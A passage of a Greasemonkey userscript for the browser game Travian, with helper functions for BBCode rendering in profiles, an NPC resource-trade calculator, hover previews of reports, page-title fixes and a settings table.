				var townName = a.textContent;
				var mapZone = a.href.match(/\?d=(\d+)/)[1];
				if (townName && mapZone)
				{
					GM_setValue('lonelyTown_' + server + uid, mapZone + '|' + townName);
					lonelyTown();
				}
			});
		}
		function newdID()
		{	//get the newdid from the dorf3.php page via AJAX request - by ms99 Thank you for this. :-)
			ajaxRequest("/dorf3.php", 'GET', null, function(AJAXrespX) {
			var aDoc = document.implementation.createDocument("", "", null);
			var aElem = document.createElement('DIV');
			aElem.innerHTML = AJAXrespX.responseText;
			aDoc.appendChild(aElem);
			var aValue = aDoc.evaluate("//div[@id='lmid2']//table[@class='tbg']//td[@class='s7 li ou']//a[contains(@href,'dorf1.php?newdid=')]", aElem, null, XPFirst, null).singleNodeValue;
			var singleTownNEWDID = aValue.href.split("=")[1];
			GM_setValue("capital" + server + uid, singleTownNEWDID);
			lonelyTown();
			});			
		}
		if (!find("//div[@id='lright1']//table[@class='f10']//a[contains(@href, 'newdid')]", XPFirst))
		{
			var href = find("//table[@id='navi_table']//td[@class='menu']//a[contains(@href, 'spieler.php')]/@href", XPFirst).nodeValue;
			var uid = href.match(/uid=(\d+)/)[1];
			if (ltownID = GM_getValue("capital" + server + uid, false))
			{
				if (ltown = GM_getValue('lonelyTown_' + server + uid, false))
				{
					ltown = ltown.split('|');
					if (!(lright1 = find("//div[@id='lright1']", XPFirst)))
						lright1 = $elem("div", "", {"id": "lright1"}, {}, "lmidall");
					var A = $elem('a', '<span class="f10 c0 s7 b">'+ T('ALDEA') + ':</span>', {'href': 'dorf3.php'});
					lright1.insertBefore(A, lright1.firstChild);
					var Table = $elem('table', '', {'class': 'f10'});
					var tbody = $elem('tbody', '', {}, {}, Table);
					var tr = $elem('tr', '', {}, {}, tbody);
					var td = $elem('td', '<span class="c2">&#8226;</span>&nbsp;&nbsp;', {'class': 'nbr'}, {}, tr);
					a = $elem('a', ltown[1], {'class': 'active_vl', 'href': '?newdid='+ ltownID}, {}, td);

					td = $elem('td', '', {'class': 'right'}, {}, tr);
					table = $elem('table', '',
					{
						'class': 'dtbl',
						'cellspacing': 0,
						'cellpadding': 0
					}, {}, td);
					tbody = $elem('tbody', '', {}, {}, table);
					tr = $elem('tr', '', {}, {}, tbody);
					$elem('td', '(' + id2xy(ltown[0]).x, {'class': 'right dlist1'}, {}, tr);
					$elem('td', '|', {'class': 'center dlist2'}, {}, tr);
					$elem('td', id2xy(ltown[0]).y + ')', {'class': 'left dlist3'}, {}, tr);
					insertAfter(A, Table);
				}
				else
					downTown(href, uid);
			}
			else
				newdID();
			if (location.href.indexOf('spieler.php?s=1') > -1)
				GM_setValue('lonelyTown_' + server + uid, false);
		}
	}

	/**
	* Development by Booboo
	**/

	function BBcodedProfile(){
		var profiles = find('//td[@class="slr3"]', XPList);
		for(var i = 0; i < profiles.snapshotLength; i++)
			profiles.snapshotItem(i).innerHTML = parseBBCode(profiles.snapshotItem(i).innerHTML);
	}

	function parseBBCode(str)
	{
		var temp = str;
		temp = temp.replace(/\[b\]/gi, '<span style="font-weight:bold">');
		temp = temp.replace(/\[i\]/gi, '<span style="font-style:italic">');
		temp = temp.replace(/\[u\]/gi, '<span style="text-decoration:underline">');
		temp = temp.replace(/\[&lt;\]/gi, '<div style="text-align:left">');
		temp = temp.replace(/\[&gt;\]/gi, '<div style="text-align:right">');
		temp = temp.replace(/\[blink\]/gi, '<span style="text-decoration:blink">');
		temp = temp.replace(/\[\/[biu]\]|\[\/blink\]/gi, '</span>');
		temp = temp.replace(/\[c\]/gi, '<center>');
		temp = temp.replace(/\[\/c\]/gi, '</center>');
		temp = temp.replace(/\[\/(&lt;|&gt;)\]/gi, '</div>');
		temp = temp.replace(/\[color=([a-z]+|#[\da-f]{3,6})\]/gi, '<font color="$1">');
		temp = temp.replace(/\[\/color\]/gi, '</font>');
		temp = temp.replace(/\[url\](.*)\[\/url\]/gim, '<a href="$1" target="_blank">$1</a>');
		temp = temp.replace(/\[url=(.*)\](.*)\[\/url\]/gim, '<a href="$1" target="_blank">$2</a>');
		temp = temp.replace(/\[img\](.*)\[\/img\]/gi, '<img src="$1" />');
		temp = temp.replace(/(.|^)((ftp|http|https|file):\/\/[\w.\/?;&=$_+!*'|-]+)(<br[\s\/]?>|[\s\t\)\]]|$)/gim, '$1<a href="$2" target="_blank">$2</a>$4');
		temp = temp.replace(/\b([a-z\d._%+-]+@[a-z\d.-]+\.[a-z]{2,4})\b/gi, '<a href="mailto:$1">$1</a>');
		coords = temp.match(/\(\s*-?\d+\s*[\/|,]\s*-?\d+\s*\)/gi);
		root = "http://" + document.domain;
		if (coords)
		{
			var ret = '';
			for (i = 0; i < coords.length; i++)
			{
				current = coords[i];
				xs = current.replace(/\(\s*(-?\d+)\s*[\/|,]\s*(-?\d+)\s*\)/, "$1");
				ys = current.replace(/\(\s*(-?\d+)\s*[\/|,]\s*(-?\d+)\s*\)/, "$2");
				x = parseInt(xs) - 400;
				y = 400 - parseInt(ys);
				z = 801 * (y + 1) + x;
				ret += temp.slice(0, temp.indexOf(current) + current.length) + '[<a href="' + root + '/a2b.php?z=' + z + '"><img src="' + img('a/att_all.gif') + '" style="margin:3px 0px 1px 3px; display: inline" height="10" width="10" title="' + T('ATACAR') + '" alt="' + T('ATACAR') + '" border="0"></a><a href="' + root + '/build.php?z=' + z + '&gid=17"><img src="' + img('r/4.gif') + '" style="margin:3px 0px 1px 3px; display: inline" height="12" width="12" title="' + T('ENVIAR') + '" alt="' + T('ENVIAR') + '" border="0"></a><a href="' + root + '/karte.php?z=' + z + '">O</a>]';
				temp = temp.slice(temp.indexOf(current) + current.length);
			}
			ret += temp;
		}
		return ret ? ret : temp;
	}

	function igmlinks()
	{
		OurArea = find("//td[@colspan='3']", XPList);
		for (var i = 0; i < OurArea.snapshotLength; i++) {
			LetterArea = OurArea.snapshotItem(i);
			if ($tags('textarea', LetterArea).length != 0) continue;
			LetterArea.innerHTML = parseBBCode(LetterArea.innerHTML);
		}
	}

	/**
	* Based on Travian NPC Helper - by GP
	**/
	function NPC_Helper_Init(){
		if(!readCookie('NPC_help'))
			return;
		if (is_npc_page())
		{
			fill_out_npc_form(url);
			persist_building_name();
		}
		else if (is_post_npc_page())
				insert_npc_back_link();
		update();
	}

	function is_npc_page()
	{
	    var xp = find('//tr[@class="rbg"]/td[@colspan="5"]', XPListO);
	    return (xp.snapshotLength == 1 && $names('m2[]').length == 4);
	}

	function is_post_npc_page()
	{
	    var xp = find('//p[@class="txt_menue"]/following-sibling::*/img[@class="res"]', XPListO);
	    return (xp.snapshotLength == 8);
	}

	function is_troops_page()
	{
	    var xp = find('//tr[@class="cbg1"]', XPListO);
	    return (xp.snapshotLength && $names('s1').length > 0);
	}

	function fill_out_npc_form(url)
	{
	    if (url.indexOf('&' + npc_res_param) != npc_url.length) return false;
	    var needed = get_query_param(url, npc_res_param).split(',');
	    var inputs = $names('m2[]');
	    for (var i = 0; i < 4; i++)
	    {
	        inputs[i].value = needed[i];
	    }
	    unsafeWindow.calculateRest();
	}

	function get_building_names()
	{
	    var names = new Array();
		var xp = find('//div[@id="lmid2"]//h2', XPListO);
	    if (xp.snapshotLength == 0)
	        xp = find('//div[@id="lmid2"]//h1/b', XPListO);
	    for (var i = 0; i < xp.snapshotLength; i++)
	    {
	        names.push(xp.snapshotItem(i).textContent);
	    }
	    return names;
	}

	function persist_building_name()
	{
	    var name = get_query_param(url, npc_name_param);
	    if (name != undefined)
	    {
	        var xp = find('//form[@name="snd"]', XPListO);
	        xp.snapshotItem(0).action = add_query_param(xp.snapshotItem(0).action, npc_name_param, name);
	    }
	}

	function insert_npc_back_link()
	{
	    var bname = get_query_param(url, npc_name_param);
	    if (!bname) return;
	    $elem('p', '<a href="#" onclick="window.history.go(-2)"> &laquo; ' + bname + '</a>', {}, {}, 'lmid2');
	}

	function get_multiplier_fields()
	{
	    var xp = find('//table[@class="tbg"]/tbody/tr/td/input[starts-with(@name, "t")]', XPListO);
	    if (!xp.snapshotLength) return;
	    var fields = new Array();
	    for (var i = 0; i < xp.snapshotLength; i++)
	        fields.push(xp.snapshotItem(i));
	    return fields;
	}

	function get_multipliers(fields)
	{
	    if (fields == undefined) return;
	    var inputs = new Array();
	    for (var i = 0; i < fields.length; i++)
	    {
	        var f = fields[i].value;
	        inputs.push(f.length == 0 || isNaN(f) ? 0 : parseInt(f));
	    }
	    return inputs;
	}

	function get_max_multiplier()
	{
	    var xp = find('//table[@class="f10"]/tbody/tr/td/b[1]', XPListO);
	    if (xp.snapshotLength == 0 || xp.snapshotItem(0).innerHTML.match(/\s*\d+\s*/) == null) return;
	    var abs_max = parseInt(xp.snapshotItem(0).innerHTML);

	    var m_fields = get_multiplier_fields();
	    if (m_fields == undefined || m_fields.length != 1) return;
	    xp = find('//td[@class="s7"]/div/span[@class="c f75"]', XPListO);
	    if (xp.snapshotLength != 1) return;
	    var re_m = xp.snapshotItem(0).innerHTML.match(/\s*\(.+: \d+\)/);
	    if (re_m == null) return;
	    var total_available = parseInt(xp.snapshotItem(0).innerHTML.replace(/[^\d]/g, ''));

	    var total_in_progress = 0;
	    xp = find('//table[@class="tbg"][2]/tbody/tr/td[2]', XPListO);
	    for (var i = 0; i < xp.snapshotLength; i++)
	    {
	        var n = xp.snapshotItem(i).innerHTML.replace(/[^\d]/g, '');
	        if (n.length && !isNaN(n)) total_in_progress += parseInt(n);
	    }

	    return abs_max - total_available - total_in_progress;
	}

	function get_available_resources()
	{
	    var resources = new Array();
	    for (var i = 4; i > 0; i--)
	    {
	        var td = get('l' + i);
	        var parts = td.innerHTML.split('/');
	        resources.push(parseInt(parts[0]));
	    }
	    return resources;
	}

	function get_hourly_production()
	{
	    var prod = new Array();
	    for (var i = 4; i > 0; i--)
	    {
	        var td = get('l' + i);
	        prod.push(parseInt(td.title));
	    }
	    return prod;
	}

	function update()
	{
	    update_totals(1, '//table[@class="f10"]/tbody/tr[1]/td');
	    var multipliers = null;
	    if (is_troops_page())
	        multipliers = get_multipliers(get_multiplier_fields());
	    update_totals(2, '//table[@class="tbg"]/tbody/tr/td/table[@class="f10"]/tbody/tr[2]/td', multipliers);

	    // Update deficit/surplus as available resources change
	    window.setTimeout(update, 1000);
	}

	function update_totals(set, xp, multipliers)
	{
	    var available_res = get_available_resources();
	    var total_have = 0;
	    for (var i = 0; i < 4; i++)
	        total_have += available_res[i];
	    var hourly_production = get_hourly_production();
	    var total_hourly_production = 0;
	    for (var i = 0; i < 4; i++)
	        total_hourly_production += hourly_production[i];
	    var building_names = get_building_names();
	    var multiplier_fields = get_multiplier_fields();

	    // Needed resources
	    var xp_need = find(xp, XPListO);
	    if (xp_need.snapshotLength == 0) return;
	    var multiplier_limit = get_max_multiplier();
	    for (var i = 0; i < xp_need.snapshotLength; i++)
	    {
	        var td = xp_need.snapshotItem(i);
	        var re_m = td.innerHTML.match(/\<img class="res"[^>]+\>\s*\d+/g);
	        if (re_m == null || re_m.length < 4) continue;
	        re_m = re_m.slice(0, 4);

	        // Read needed resources and calculate total
	        var needed_res = new Array();
	        var total_need_per_unit = 0;
	        for (var j = 0; j < 4; j++)
	        {
	            var re_m2 = re_m[j].match(/\d+$/);
	            var n = parseInt(re_m2);
	            needed_res.push(multipliers ? n * multipliers[i] : n);
	            total_need_per_unit += n;
	        }
	        var total_need = multipliers ? total_need_per_unit * multipliers[i] : total_need_per_unit;

	        // Get or create HTML container
	        var container_id = 'gpnpc_' + set + '_' + i;
	        var container = undefined;
	        while ((container = get(container_id)) == null)
	        {
	            td.innerHTML += '<br><div id="' + container_id + '" class="gp-container"> </div>';
	        }

	        // Show total & deficit/surplus
	        var r = total_have - total_need;
	        var r_s = '(' + r + ')';
	        if (r < 0)
				r_s = '<span class="gp-red">(' + r + ')</span>';
	        else if (r > 0)
				r_s = '<span class="gp-green">(+' + r + ')</span>';
	        container.innerHTML = '<b>' + T('TOTAL') + '</b>: ' + total_need + ' ' + r_s;

	        // Show time estimate
	        var dt_now = new Date();
	        var dt_est = new Date();
	        if (total_need > 0 && r < 0)
	        {
	            var sec_est = Math.ceil(Math.abs(r) / (total_hourly_production / 3600));
	            dt_est.setTime(dt_now.getTime() + (sec_est * 1000));
	            var d_est_s =
	                (dt_est.getDate() < 10 ? '0' + dt_est.getDate() : dt_est.getDate()) + '.' +
	                (dt_est.getMonth() < 9 ? '0' + (dt_est.getMonth() + 1) : (dt_est.getMonth() + 1)) +
	                (dt_now.getFullYear() < dt_est.getFullYear() ? dt_est.getYear() : '');
	            if (dt_est.getDate() == dt_now.getDate() && dt_est.getMonth() == dt_now.getMonth())
	                d_est_s = '<span class="gp-highlight">' + d_est_s + '</span>';
	            var t_est_s =
	                (dt_est.getHours() < 10 ? '0' + dt_est.getHours() : dt_est.getHours()) + ':' +
	                (dt_est.getMinutes() < 10 ? '0' + dt_est.getMinutes() : dt_est.getMinutes());
	            container.innerHTML += ' / <span class="gp-green">@</span> ' + d_est_s + ', ' + t_est_s;
	        }

	        // Show time saved by NPC
	        var time_saved = 0;
	        if (total_need > 0)
	            for (var j = 0; j < 4; j++)
	            {
	                var prod_per_minute = hourly_production[j] / 60;
	                var min_until_npc = (dt_est.getTime() - dt_now.getTime()) / 1000 / 60;
	                var available_at_npc_time = available_res[j] + (min_until_npc * prod_per_minute);
	                var deficit_at_npc_time = needed_res[j] - available_at_npc_time;
	                if (deficit_at_npc_time <= 0) continue;
	                if (prod_per_minute <= 0)
	                {
	                    time_saved = null;
	                    break;
	                }
	                var delta = Math.ceil(deficit_at_npc_time / prod_per_minute);
	                if (delta > time_saved)
	                    time_saved = delta;
	            }
	        if (time_saved == null)
	            container.innerHTML += ' / &#8734;';
	        else if (time_saved > 0)
	        {
	            var delta_h = Math.floor(time_saved / 60);
	            var delta_m = time_saved % 60;
	            var delta_str = '-' + delta_h + 'h' + delta_m + 'm';
	            if (delta_h < 1)
	                delta_str = '<span class="gp-red">' + delta_str + '</span>';
	            container.innerHTML += ' / ' + delta_str;
	        }

	        // Show max.
	        if (multipliers)
	        {
	            var max = Math.floor(total_have / total_need_per_unit);
	            if (max > multiplier_limit) max = multiplier_limit;
	            container.innerHTML += ' / max. <a href="#" onclick="document.snd.' + multiplier_fields[i].name + '.value=' + max + '; return false;">' + max + '</a>';
	        }

	        // Show NPC link
	        if (total_need > 0 && r >= 0 && (time_saved > 0 || time_saved == null))
	        {
	            var npc_url_i = add_query_param(npc_url, npc_res_param, needed_res.join(','));
	            npc_url_i = add_query_param(npc_url_i, npc_name_param, (building_names.length > 1 ? building_names[i] : building_names[0]));
	            container.innerHTML += '&nbsp;<a href="' + npc_url_i + '"> &raquo; NPC</a>';
	        }
	    }
	}

	function parse_url(url)
	{
	    var url_parts = url.split('?', 2);
	    if (url_parts.length == 1)
			url_parts[1] = '';
	    var parts = {path: url_parts[0], query: url_parts[1]};
	    return parts;
	}

	function get_query_param(url, param)
	{
	    var pairs = parse_url(url).query.split('&');
	    for (var i = 0; i < pairs.length; i++)
	    {
	        var ki = pairs[i].split('=');
	        if (ki[0] == param)
				return decodeURIComponent(ki[1]);
	    }
	}

	function add_query_param(url, param, value)
	{
	    var add_pair = param + '=' + encodeURIComponent(value);
	    var added = false;
	    var url_parts = parse_url(url);
	    var pairs = url_parts.query.split('&');
	    for (var i = 0; i < pairs.length; i++)
	    {
	        var ki = pairs[i].split('=');
	        if (ki[0] == param)
	        {
	            pairs[i] = add_pair;
	            added = true;
	            break;
	        }
	    }
	    if (!added)
			pairs.push(add_pair);
	    return url_parts.path + '?' + pairs.join('&');
	}

	/** END of Travian NPC Helper **/
	/**--------------------------------- TQR ---------------------------------
	 * Travian Quick Report v1.4b
	 * author  : mikrop
	 **/

	/**
	 * Podle urlResult priradi hodnotu definovanemu attributu v poradi
	 * var attributesArray = new Array(URLX.BERICHTE, URLX.NACHRICHTEN, URLX.ALLIANZ, URLX.KARTE);
	 *
	 * @param {Object} attributesArray
	 */
	function setObjectAttribute(attributesArray)
	{
		var attribute = null;
		switch (urlResult)
		{
			case URLX.BERICHTE:
			attribute = attributesArray[0];
			break;
			case URLX.NACHRICHTEN:
			attribute = attributesArray[1];
			break;
			case URLX.ALLIANZ:
			attribute = attributesArray[2];
			break;
			case URLX.KARTE:
			attribute = attributesArray[3];
			break;
			default:
			GM_log('Nastaveni pro neznamou url');
			break;
		}
		return (attribute);
	}

	function xmlhttpRequest(url, anonymousFunction)
	{
		GM_xmlhttpRequest
		(
			{
				method: 'GET',
				url: url,
				headers:
				{
					'User-agent': 'Mozilla/5.0 (compatible) Greasemonkey',
					'Accept': 'text/xml, text/html',
				},
				onload: function(response)
				{
					if (response.status == 200 || response.status == 304)
					{
						var tmp = window.document.createElement('div');
						tmp.innerHTML = response.responseText;
						anonymousFunction(tmp);
					}
					else
						{
							GM_log('XML request error: ' + response.status);
						}
				}
			}
		);
	}

	function createReportElements(parent)
	{
		var elDivPaddingLeft = new Array('', '30px', '', '');
		var elDiv = window.document.createElement('div');
		elDiv.setAttribute('class', 'report');
		elDiv.style.paddingLeft = setObjectAttribute(elDivPaddingLeft);
		elDiv.style.textAlign = 'left';
		elDiv.style.minWidth = '350px';
		elDiv.style.display = 'none';

		var elTdColspan = new Array(3, 4, 4, 0);
		var elTd = window.document.createElement('td');
		elTd.setAttribute('colspan', setObjectAttribute(elTdColspan));
		elTd.appendChild(elDiv);

		if (location.href.match(/karte\.php(\?d=|\?newdid)/))//if (urlResult == URLX.KARTE)
		{
			parent.parentNode.parentNode.parentNode.insertBefore(elTd, parent.nextSibling);
		} else
		{
			var elTr = window.document.createElement('tr');
			elTr.appendChild(elTd);
			parent.parentNode.insertBefore(elTr, parent.nextSibling);
		}
	}

	function resultXPTab(tmp)
	{
		var XPTabArray = new Array(XPTbgTab, ".//table[contains(@class, 'f10')]", XPTbgTab, XPTbgTab);
		var XPTab = setObjectAttribute(XPTabArray);
		var result = document.evaluate(XPTab, tmp, null, XPList, null);

		if (result.snapshotLength)
		{
			return (result.snapshotItem(0));
		} else
		{
			return (null);
		}
		tmp = null;
	}

	function appendReportElement(i, tbgTab)
	{
		var sampleXp = ".//div[contains(@class, 'report')]";
		var result = find(sampleXp, XPList);
		var parentDiv = result.snapshotItem(i);
		parentDiv.appendChild(tbgTab);
	}

	function myEventListener(parent, j, e, d)
	{
		parent.addEventListener
		(e, function(event)
			{
				var el = event.target;
				var elDiv = null;
				if (location.href.match(/karte\.php(\?d=|\?newdid)/))//if (urlResult == URLX.KARTE)
				{
					elDiv = el.parentNode.parentNode.parentNode.childNodes[(5 + j)].firstChild;
				} else
				{
					elDiv = el.parentNode.parentNode.nextSibling.firstChild.firstChild;
				}
				elDiv.style.display = d;
			}, false
		);
	}

	function addReportListener(parent, j)
	{
		var objectEvents = { e: ['mouseover', 'mouseout'], d: ['block', 'none'] };
		for (var i = 0; i < 2; i++)
		{
			myEventListener(parent, j, objectEvents.e[i], objectEvents.d[i]);
		}
	}

	function TQR()
	{
		var sampleXp = null;
		if (location.href.match(/karte\.php(\?d=|\?newdid)/))	//if (urlResult == URLX.KARTE)
		{
			sampleXp = "//table[@class='f10']/tbody/tr/td[2]/li/a";
		} else
		{
			sampleXp = XPTbgTab + "/tbody/tr[not(@class='rbg' or @class='cbg1')]";
		}
		var result = find(sampleXp, XPList);

		if (result.snapshotLength)
		{
			var i = 0;
			for (j = 0; j < result.snapshotLength; j++)
			{
				var parent = result.snapshotItem(j);
				createReportElements(parent);
				var pageAnchor = null;
				if ((location.href.match(/berichte.php($|\?t=)/)) || (location.href.match(/allianz.php\?s=3/)))//if ((urlResult == URLX.BERICHTE) || (urlResult == URLX.ALLIANZ))
				{
					pageAnchor = parent.childNodes[3].firstChild;
				} else if (location.href.match(/nachrichten\.php($|\?t=2|\?t=3)/))//if (urlResult == URLX.NACHRICHTEN)
				{
					pageAnchor = parent.childNodes[2].firstChild;
				} else if (location.href.match(/karte\.php(\?d=|\?newdid)/))//if (urlResult == URLX.KARTE)
				{
					/*
					 * Klicka, aby nedochazelo po zobrazeni reportu k odsunuti ostatnich odkazu a tim vyvolani
					 * udalosti onMouseOut
					 */
					parent.parentNode.parentNode.style.verticalAlign = 'top';
					pageAnchor = parent;
				}
				addReportListener(pageAnchor, j);
				xmlhttpRequest
				(pageAnchor.href, function(tmp)
					{
					  var XPTab = resultXPTab(tmp);
					  appendReportElement(i++, XPTab);
					}
				);
			}
		}
	}
	/**---------------------------------  End TQR --------------------------------- */

	function fix_title()
	{
		if ((CONFIG_TITLEFIX != 1) && (CONFIG_TITLEFIX != 2) && (CONFIG_TITLEFIX != 3)) { return; }
		var xp = xpath('//h1');
		if (xp.snapshotLength == 0) return;
		var title = xp.snapshotItem(0).innerHTML.replace(/\<[^>]*?\>/g, '');

		var title = getInnerText(xp.snapshotItem(0)).replace(/\<[^>]*?\>/g, '');

		if (window.location.pathname.indexOf('/dorf2.php') == 0)
			title = String.fromCharCode(164, 32) + title;
		switch (CONFIG_TITLEFIX)
		{
			case 1:	// Adds the title inside the page
					document.title += " - " + title;
					break;

			case 2:	// Crops the document title and adds the title inside the page
					var dTitle = document.title;
					var spacePos = dTitle.indexOf(" ");
					dTitle = dTitle.substr(0, 1) + dTitle.substr(spacePos);
					document.title = dTitle + " - " + title;
					break;

			case 3:	// Replaces the document title with the title inside the page
					document.title = title;
					break;

			default:document.title = "ERROR";
				break;
		}
	}

	function xpath(xp, context, doc)
	{

		doc = doc != null ? doc : document;
		context = context != null ? context : document;

		return doc.evaluate(xp, context, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

	}

	/** Muestra una tabla en la pagina de perfil con los valores almacenados en cookies por el script */
	function mostrarConfiguracion()
	{
		if (get('configuracion'))
			return;
		if(a = find("//div[@class='map_details_actions']//table[@class='f10' and @width='100%']", XPFirst));
		else var a = get('lmid2');
		if (!a)
			a = find("//form", XPFirst);
		var tabla = $elem("TABLE", "", {
			"cellspacing": 1,
			"cellpadding": 2,
			"class": "tbg",
			"id": "configuracion"
		});

		var fila = $elem("TR");
		var td = $elem("TD", T('TBH_SETUP_I'), {
			"class": "rbg",
			"colspan": 3
		}, {}, fila);
		tabla.appendChild(fila);

		// Parametros reconocidos
		var parametros =
		[
			"imgx",
			"inf1" + server,
			"inf1b" + server,
			"inf2" + server,
			"inf3" + server,
			"blocNotasinfo" + server,
			"icone" + server,
			"BattleAnalyse" + server,
			"Tototroupe" + server,
			"APAinfo",
			"tableaudorf1" + server,
			"initvillinfo2" + server,
			"infosiege" + server,
			"tableaudorf2" + server,
			"initvillinfo" + server,
			"infosiege2" + server,
			"calculateFillTimeInfo" + server,
			"FillTimeinfo",
			"IMGinfo" + server,
			"BBcodeHelp",
			"posvilleinfo" + server,
			"villeinfo" + server,
			"lienfix" + server,
			"bookmarksinfo0" + server,
			"bookmarksinfo1" + server,
			"bookmarksinfo2" + server,
			"bookmarksinfo3" + server,
			"bookmarksinfo4" + server,
			"NPC_help",
			"TQR1" + server,
			"TQR2" + server,
			"TQR3" + server,
			"TQR4" + server
		];
		var parameterDescriptions =
		[
			T('TAB27'),
			"<font color=#808000>" + T('TAB13') + "</font>",
			"<font color=#808000>" + T('TAB13B') + "</font>",
			"<font color=#808000>" + T('TAB14') + "</font>",
			"<font color=#808000>" + T('TAB18') + "</font>",
			"<font color=#DA70D6>" + T('TAB17') + "</font>",
			"<font color=#DA70D6>" + T('TAB29') + "</font>",
			"<font color=#FF0000>" + T('TAB30') + "</font>",
			"<font color=#FF0000>" + T('TAB25') + "</font>",
			"<font color=#FF0000>" + T('TAB23') + "</font>",
			"<font color=#32CD32>" + T('TAB5') + " [dorf1]</font>",
			"<font color=#32CD32>" + T('TAB32') + " [dorf1]</font>",
			"<font color=#32CD32>" + T('TAB26') + " [dorf1]</font>",
			"<font color=#006400>" + T('TAB6') + " [dorf2]</font>",
			"<font color=#006400>" + T('TAB15') + " [dorf2]</font>",
			"<font color=#006400>" + T('TAB26') + " [dorf2]</font>",
			"<font color=#FF7F50>" + T('TAB7') + "</font>",
			"<font color=#FF7F50>" + T('TAB24') + "</font>",
			"<font color=#008B8B>" + T('TAB16') + " [nachrichten]</font>",
			"<font color=#008B8B>" + T('TAB31') + " [nachrichten]</font>",
			"<font color=#FF00FF>" + T('TAB22') + " [dorf3]</font>",
			"<font color=#FF00FF>" + T('TAB21') + " [dorf3]</font>",
			"<font color=#0000FF>" + T('TAB20') + "</font>",
			"<font color=#0000FF>" + T('TAB19') + "</font>",
			"<font color=#0000FF>" + T('TAB8') + "</font>",
			"<font color=#0000FF>" + T('TAB9') + "</font>",
			"<font color=#0000FF>" + T('TAB10') + "</font>",
			"<font color=#0000FF>" + T('TAB11') + "</font>",
			"<font color=#5196AA>" + T('TAB33') + "</font>",
			"<font color=#FF4500>" + "(Beta test) "  + T('TAB34') + " [nachrichten]</font>",
			"<font color=#FF4500>" + "(Beta test) "  + T('TAB34') + " [berichte]</font>",
			"<font color=#FF4500>" + "(Beta test) "  + T('TAB34') + " [allianz]</font>",
			"<font color=#FF4500>" + "(Beta test) "  + T('TAB34') + " [karte]</font>"
		];
		var parameterDescriptionsAide =
		[
			'<a href="http://imgtrav.ifrance.com/" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img165.imageshack.us/img165/891/travianstattsuoq5.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'',
			'<a href="http://img529.imageshack.us/img529/9165/travianstattscfq5.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img529.imageshack.us/img529/3436/travianstatmapok9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img388.imageshack.us/img388/4392/travianaidenotepadce3.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img365.imageshack.us/img365/9845/iconeho6.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://i152.photobucket.com/albums/s199/Vud-Mannerd/Travian/BattleAnalyze.jpg" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T('AID') + '"></a>',	//pictures from napkin
			'<a href="http://img389.imageshack.us/img389/3957/travianplacerassaq8.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img389.imageshack.us/img389/938/travianpillageattaqueks6.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img515.imageshack.us/img515/3017/travianaidetableauchampom5.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://i152.photobucket.com/albums/s199/Vud-Mannerd/Travian/FieldColorsdorf1.jpg" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',	//pictures from napkin
			'<a href="http://img515.imageshack.us/img515/2130/travianaidetableaumj6.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img519.imageshack.us/img519/2889/traviand2tableaucd0.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img370.imageshack.us/img370/5308/traviand2numgg9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img389.imageshack.us/img389/5690/traviantabdorf2xl1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img339.imageshack.us/img339/1544/travianaidecompteurlo2.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img122.imageshack.us/img122/7354/travianpos0compteurbf1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img236.imageshack.us/img236/2552/travianigmgr1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://i152.photobucket.com/albums/s199/Vud-Mannerd/Travian/BB-CodeHelp.jpg" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T('AID') + '"></a>',	//pictures from napkin
			'<a href="http://img373.imageshack.us/img373/4885/travianposition1gf5.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img296.imageshack.us/img296/6571/traviantablesimpl0of6.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img519.imageshack.us/img519/9528/traviansimplytb0.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img383.imageshack.us/img383/824/travianaidehoteleb3.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img367.imageshack.us/img367/8979/travianaideadmingh7.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img501.imageshack.us/img501/4302/travianaidemilitairelb1.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
			'<a href="http://img338.imageshack.us/img338/1982/travianaideamelioux9.png" target="_blank"><img src="' + img("/a/help.gif") + '" width="15" border="0" title="' + T("AID") + '"></a>',
